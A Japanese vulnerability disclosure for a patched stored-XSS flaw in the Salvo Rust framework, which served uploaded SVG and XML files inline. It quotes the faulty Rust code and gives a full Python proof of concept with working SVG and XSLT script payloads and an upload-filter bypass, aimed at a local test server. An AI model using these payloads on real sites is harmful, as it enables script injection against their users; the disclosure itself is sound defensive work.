---
title: Stored XSS via image/svg+xml served inline by StaticDir / NamedFile (GHSA-7fh4-27xm-vxgg)
description: Rust製Webフレームワーク Salvo の StaticDir / NamedFile が SVG を Content-Disposition inline で配信するため，アップロードされたSVGで任意のJavaScriptが実行される保存型XSS (0.96.0で修正)
date: 2026-09-03 14:28:00 +0900
categories: [CyberSecurity, Bughunt]
tags: [rust, ghsa, xss]
---

> 2026/08/21: この脆弱性は [f81876e](https://github.com/salvo-rs/salvo/commit/f81876e40d88d44f338973b3308630d41afb81e6) コミットで修正されました．  
> このパッチが含まれる最小バージョンは，`0.96.0` です．
{: .prompt-info }

### Summary

`salvo_serve_static::StaticDir`(および基盤の `salvo_core::fs::NamedFile`)は，`image/svg+xml` および `text/xml` のファイルを `Content-Disposition: inline` (かつ `X-Content-Type-Options: nosniff` 無し)で配信します．

その結果，ユーザがアップロードしたファイルを `StaticDir` で配信している一般的な構成では，**攻撃者が `<script>` を含むSVGをアップロードし，被害者にそのURLを開かせる** ことで，**配信元オリジン上で任意の JavaScript を実行** するStored-XSSが存在します．

- **Title**: Stored XSS via `image/svg+xml` served `inline` by `StaticDir` / `NamedFile`
- **Reporter:** sl91994
- **Date:** 2026-08-18
- **種別:** CWE-79
- **深刻度:** Moderate
  - **CVSS v3.1**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
  - **Base Score**: 6.1
- **影響コンポーネント:** `salvo-serve-static`(`StaticDir` / `StaticFile`)，`salvo_core::fs::NamedFile`
- **確認バージョン:** salvo `0.95.2`
- **修正バージョン:** `0.96.0`
- **前提:** アプリがアップロード等の攻撃者制御ファイルを静的配信していること

| 対象               | 影響範囲             |     |
| ------------------ | -------------------- | --- |
| salvo_core / salvo | >= 0.3.0, <= 0.95.2  |     |
| salvo-serve-static | >= 0.37.9, <= 0.95.2 |     |

> Note: `StaticEmbed` は本件の影響を受けません．
> `render_embedded_data`(`crates/serve-static/src/embed.rs`)は `NamedFile` を経由しない独自の描画経路であり，`Content-Disposition` を一切出力しないため，以下で述べる分類処理を通りません．そのためSVGはブラウザ既定でインライン表示されますが，配信対象は `rust-embed` によりビルド時に埋め込まれるため攻撃者の制御下に無く，Stored-XSSは成立しません．

---

### Details

#### 危険な MIME を `inline` に分類している

`crates/core/src/fs/named_file.rs`(`fn build_content_disposition`, L415-425):

```rust
let disposition_type = disposition_type.unwrap_or_else(|| {
    if attached_name.is_some() {
        "attachment"
    } else {
        match (content_type.type_(), content_type.subtype()) {
            (mime::IMAGE | mime::TEXT | mime::VIDEO | mime::AUDIO, _) // ← image/* が inline に分類される
            | (_, mime::JAVASCRIPT | mime::JSON) => "inline",
            _ => "attachment",
        }
    }
});
```

`image/svg+xml` は `type_() == mime::IMAGE` に一致するため **`inline`** に分類されます．
また，SVG は `<script>` やイベントハンドラ属性(`onload` 等)を含むことができ，トップレベル遷移または `<iframe>` でレンダリングされると **配信元オリジンで JS が実行** することが可能です．
なお，`text/xml`(`type_() == mime::TEXT`)も同様に `inline` となり，`<?xml-stylesheet ?>`(XSLT)
経由のスクリプト実行余地が残ります．

#### 分類の内的不整合

この分類処理は **認識できない型は安全側で `attachment`** という設計ですが，XML系型では既に安全側が選ばれているのに，SVGや `text/xml` だけ漏れています．

| Content-Type            | `type/subtype` / `suffix`   | 分類       | スクリプト実行                |
| ----------------------- | --------------------------- | ---------- | ----------------------------- |
| `image/svg+xml`         | `image/svg` / `xml`         | **inline** | **可** <- 問題                |
| `text/xml`              | `text/xml` / -              | **inline** | **XSLT経由で可** <- see Note  |
| `application/xml`       | `application/xml` / -       | attachment | 不可                          |
| `application/xhtml+xml` | `application/xhtml` / `xml` | attachment | 不可                          |
| `text/html`             | `text/html` / -             | inline     | 可 (静的サーバとして仕様通り) |

> Note: `application/xml` は、開発者が `NamedFileBuilder::content_type()` を使用してコンテンツタイプを明示的に設定した場合にのみ現れます。`mime_infer::from_path` (`crates/serve-static/src/dir.rs:545`) は `.xml` を `text/xml` にマッピングするためです。

### デフォルトで有効・上書き手段がない

`Content-Disposition` はデフォルトで有効になっています．

`crates/core/src/fs/named_file.rs` (L54):

```rust
#[bitflags(default = Etag | LastModified | ContentDisposition)]
```

`send_inner()` で明示指定が無い場合に上記の分類が使われて出力されます．

`crates/core/src/fs/named_file.rs` (`fn send_inner`, L702-718):

```rust
if self.flags.contains(Flag::ContentDisposition) {
    if let Some(content_disposition) = self.content_disposition.take() {
        #...
    } else if !res.headers().contains_key(CONTENT_DISPOSITION) {
        // skip to set CONTENT_DISPOSITION header if it is already set.
        match build_content_disposition(&self.path, &self.content_type, None, None) {
            #...
        }
    }
}
```

`NamedFileBuilder` には `disposition_type() / attached_name() / disable_content_disposition()` が存在しますが，`StaticDir` / `StaticFile` はこれらを呼び出す公開APIを持っていません．

```shell
$ grep -rn "disposition\|attached_name" crates/serve-static/src/
# 0 hits
```

#### `nosniff` 等の多層防御が無い

```shell
$ grep -rn "nosniff\|X-Content-Type-Options\|Content-Security-Policy" crates/ --include="*.rs"
# 0 hits
```

`NamedFile` や `StaticEmbed` からのレスポンスには、`X-Content-Type-Options: nosniff` ヘッダーが含まれていません．
SVGは適切なMIMEタイプで配信されているため，`nosniff` の有無はこの問題の前提条件ではありませんが，そのようなセキュリティ強化策が講じられていないことも事実です．

---

### PoC

`poc.py` は，画像のみを許可する検証を備えたSalvoサーバをビルド・起動し，1)HTMLペイロードが検証で拒否されること，2)同じ検証をSVGとXMLが通過すること，3)そのSVGとXMLが `Content-Disposition: inline` で配信されることを順に示します．

`poc.py`

{% raw %}

```python
#!/usr/bin/env python3
"""
Salvo StaticDir SVG / text-xml XSS PoC

On first run it builds the vulnerable Salvo server binary into the current
directory (./server); afterwards it reuses that binary (rebuilding
automatically when this script's embedded Rust source changes).

Steps:
  0. Build ./server if missing or stale.
  1. Launch the server.
  2. Upload the SVG exploit      -> /upload      (image endpoint).
  3. Upload the XML + XSL exploit -> /upload-doc  (document endpoint).
  4. Keep the server running so the URLs can be opened in a browser.
"""

import hashlib
import http.client
import os
import shutil
import signal
import socket
import subprocess
import sys
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = "127.0.0.1"
PORT = 5810
# Vulnerable server binary. Built into the current dir on first run if missing.
SERVER_BIN = os.environ.get("SERVER_BIN", os.path.join(HERE, "server"))
# Local salvo checkout the generated server depends on (for building).
SALVO_CRATE = os.path.join(HERE, "crates", "salvo")
BUILD_DIR = os.path.join(HERE, ".server-build")

UPLOAD_NAME = "poc.svg"
XML_NAME = "poc.xml"
XSL_NAME = "poc.xsl"

CARGO_TOML = f"""[package]
name = "server"
version = "0.0.0"
edition = "2021"
publish = false
[workspace]

[dependencies]
salvo = {{ path = "{SALVO_CRATE}", default-features = false, features = ["server", "http1", "serve-static"] }}
tokio = {{ version = "1", features = ["macros", "rt-multi-thread"] }}
"""

MAIN_RS = f"""
use std::fs::create_dir_all;
use std::path::Path;

use salvo::http::mime;
use salvo::prelude::*;
use salvo::serve_static::StaticDir;

/// Image-only allowlist, as a typical image-upload endpoint would enforce.
const ALLOWED_EXT: [&str; 6] = ["png", "jpg", "jpeg", "gif", "webp", "svg"];

/// Document endpoint blocklist. Models a developer who "already fixed SVG
/// XSS" by blocking the obviously-scriptable types, but still accepts XML.
const BLOCKED_EXT: [&str; 6] = ["html", "htm", "xhtml", "xht", "svg", "js"];

#[handler]
async fn upload(req: &mut Request, res: &mut Response) {{
    let Some(file) = req.file("file").await else {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("no file field"));
        return;
    }};
    let name = file.name().unwrap_or("upload").to_owned();

    // Validation 1: the extension must be an image extension.
    let ext = Path::new(&name)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if !ALLOWED_EXT.contains(&ext.as_str()) {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain(format!("rejected: extension {{ext:?}} not allowed")));
        return;
    }}

    // Validation 2: the declared Content-Type must be image/*.
    let is_image = file
        .content_type()
        .map(|m| m.type_() == mime::IMAGE)
        .unwrap_or(false);
    if !is_image {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("rejected: content-type is not image/*"));
        return;
    }}

    let dest = format!("uploads/{{name}}");
    match std::fs::copy(file.path(), Path::new(&dest)) {{
        Ok(_) => res.render(Text::Plain(format!("saved:{{name}}"))),
        Err(e) => {{
            res.status_code(StatusCode::INTERNAL_SERVER_ERROR);
            res.render(Text::Plain(format!("copy failed: {{e}}")));
        }}
    }}
}}

/// Generic document-upload endpoint. Blocklists html/svg/js (extension and
/// content-type) but accepts everything else -- including .xml and .xsl.
#[handler]
async fn upload_doc(req: &mut Request, res: &mut Response) {{
    let Some(file) = req.file("file").await else {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("no file field"));
        return;
    }};
    let name = file.name().unwrap_or("upload").to_owned();

    // Block by extension.
    let ext = Path::new(&name)
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    if BLOCKED_EXT.contains(&ext.as_str()) {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain(format!("rejected: extension {{ext:?}} is blocked")));
        return;
    }}

    // Block the obviously-scriptable content types too.
    let blocked_ct = file
        .content_type()
        .map(|m| {{
            let essence = m.essence_str();
            essence == "text/html"
                || essence == "image/svg+xml"
                || essence == "application/xhtml+xml"
                || essence.ends_with("javascript")
        }})
        .unwrap_or(false);
    if blocked_ct {{
        res.status_code(StatusCode::BAD_REQUEST);
        res.render(Text::Plain("rejected: content-type is blocked"));
        return;
    }}

    let dest = format!("uploads/{{name}}");
    match std::fs::copy(file.path(), Path::new(&dest)) {{
        Ok(_) => res.render(Text::Plain(format!("saved:{{name}}"))),
        Err(e) => {{
            res.status_code(StatusCode::INTERNAL_SERVER_ERROR);
            res.render(Text::Plain(format!("copy failed: {{e}}")));
        }}
    }}
}}

#[tokio::main]
async fn main() {{
    create_dir_all("uploads").unwrap();
    let router = Router::new()
        .push(Router::with_path("upload").post(upload))
        .push(Router::with_path("upload-doc").post(upload_doc))
        .push(Router::with_path("uploads/{{*path}}").get(StaticDir::new(["uploads"])));
    let acceptor = TcpListener::new("0.0.0.0:{PORT}").bind().await;
    Server::new(acceptor).serve(router).await;
}}
"""

SVG_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
    '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"\n'
    '     onload="alert(\'XSS on \' + document.domain)">\n'
    "  <script>alert('XSS on ' + document.domain)</script>\n"
    '  <text x="10" y="35">salvo StaticDir SVG-XSS PoC</text>\n'
    "</svg>\n"
)

XML_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    f'<?xml-stylesheet type="text/xsl" href="{XSL_NAME}"?>\n'
    "<root>salvo StaticDir text/xml XSLT-XSS PoC</root>\n"
)

XSL_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<xsl:stylesheet version="1.0"\n'
    '    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
    '  <xsl:output method="html"/>\n'
    '  <xsl:template match="/">\n'
    '    <html xmlns="http://www.w3.org/1999/xhtml">\n'
    "      <body>\n"
    "        <h2>salvo StaticDir text/xml XSLT-XSS PoC</h2>\n"
    "        <script>alert('XSLT-XSS on ' + document.domain)</script>\n"
    '        <img src="x" onerror="alert(\'XSLT-XSS(img) on \' + document.domain)"/>\n'
    "      </body>\n"
    "    </html>\n"
    "  </xsl:template>\n"
    "</xsl:stylesheet>\n"
)


STAMP_FILE = SERVER_BIN + ".stamp"


def source_hash():
    return hashlib.sha256((CARGO_TOML + MAIN_RS).encode()).hexdigest()


def needs_build():
    if not os.path.isfile(SERVER_BIN):
        return True
    try:
        with open(STAMP_FILE) as f:
            return f.read().strip() != source_hash()
    except OSError:
        return True


def log(msg):
    print(f"[poc] {msg}", flush=True)


def wait_port(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((HOST, PORT), timeout=1):
                return True
        except OSError:
            time.sleep(0.2)
    return False


def build_server():
    if shutil.which("cargo") is None:
        log("cargo not found on PATH (try running inside `nix develop`).")
        sys.exit(1)
    if not os.path.isdir(SALVO_CRATE):
        log(f"cannot find salvo crate at {SALVO_CRATE}")
        sys.exit(1)
    log(f"server binary not found; building into {SERVER_BIN} ...")
    if os.path.isdir(BUILD_DIR):
        shutil.rmtree(BUILD_DIR)
    os.makedirs(os.path.join(BUILD_DIR, "src"))
    with open(os.path.join(BUILD_DIR, "Cargo.toml"), "w") as f:
        f.write(CARGO_TOML)
    with open(os.path.join(BUILD_DIR, "src", "main.rs"), "w") as f:
        f.write(MAIN_RS)
    log("cargo build (first build compiles salvo; may take a few minutes)...")
    r = subprocess.run(["cargo", "build", "--quiet"], cwd=BUILD_DIR)
    if r.returncode != 0:
        log("build failed")
        sys.exit(1)
    shutil.copy2(os.path.join(BUILD_DIR, "target", "debug", "server"), SERVER_BIN)
    with open(STAMP_FILE, "w") as f:
        f.write(source_hash())
    log(f"built: {SERVER_BIN}")


def start_server():
    if needs_build():
        build_server()
    log(f"launching server: {SERVER_BIN}")
    proc = subprocess.Popen(
        [SERVER_BIN],
        cwd=os.path.dirname(SERVER_BIN) or ".",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    if not wait_port():
        stop_server(proc)
        log("server did not open port in time")
        sys.exit(2)
    log(f"server listening on {HOST}:{PORT}")
    return proc


def upload_payload(filename, payload, content_type, endpoint="/upload"):
    boundary = "----salvopoc" + uuid.uuid4().hex
    body = bytearray()
    body += f"--{boundary}\r\n".encode()
    body += (
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    ).encode()
    body += f"Content-Type: {content_type}\r\n\r\n".encode()
    body += payload.encode()
    body += f"\r\n--{boundary}--\r\n".encode()

    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    conn.request(
        "POST",
        endpoint,
        body=bytes(body),
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
        },
    )
    resp = conn.getresponse()
    text = resp.read().decode(errors="replace")
    conn.close()
    log(f"upload {filename} -> HTTP {resp.status} {text!r}")
    return resp.status


def stop_server(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except ProcessLookupError:
        pass


def upload_exploits():
    # SVG exploit through the image-upload endpoint.
    if upload_payload(UPLOAD_NAME, SVG_PAYLOAD, "image/svg+xml", "/upload") != 200:
        raise RuntimeError("SVG upload failed")

    # text/xml + XSLT exploit through the document endpoint.
    if upload_payload(XML_NAME, XML_PAYLOAD, "text/xml", "/upload-doc") != 200:
        raise RuntimeError("XML upload failed")
    if upload_payload(XSL_NAME, XSL_PAYLOAD, "text/xml", "/upload-doc") != 200:
        raise RuntimeError("XSL upload failed")


def main():
    proc = start_server()
    try:
        upload_exploits()

        print(flush=True)
        log("exploits uploaded. Open these URLs in a browser (expect an alert box):")
        log(f"    SVG : http://{HOST}:{PORT}/uploads/{UPLOAD_NAME}")
        log(f"    XSLT: http://{HOST}:{PORT}/uploads/{XML_NAME}")
        log("server is running. Press Ctrl-C to stop.")
        proc.wait()
    except KeyboardInterrupt:
        print(flush=True)
        log("stopping server")
    finally:
        stop_server(proc)


if __name__ == "__main__":
    main()
```

{% endraw %}

上記PoCを実行したのち，ブラウザで `http://127.0.0.1:5810/uploads/poc.{svg/xml/xsl}` を開くと，XSSアラートが表示されます．

```shell
$ curl -sD - -o /dev/null http://127.0.0.1:5810/uploads/poc.svg
HTTP/1.1 200 OK
content-disposition: inline
content-type: image/svg+xml
#...

$ curl -sD - -o /dev/null http://127.0.0.1:5810/uploads/poc.xml
HTTP/1.1 200 OK
content-disposition: inline
content-type: text/xml; charset=utf-8
#...

$ curl -sD - -o /dev/null http://127.0.0.1:5810/uploads/poc.xsl
HTTP/1.1 200 OK
content-disposition: inline
content-type: text/xml; charset=utf-8
#...
```

---

### Impact

配信元オリジンでの任意JS実行により，標準的なStored-XSSの被害が成立することが予想されます．
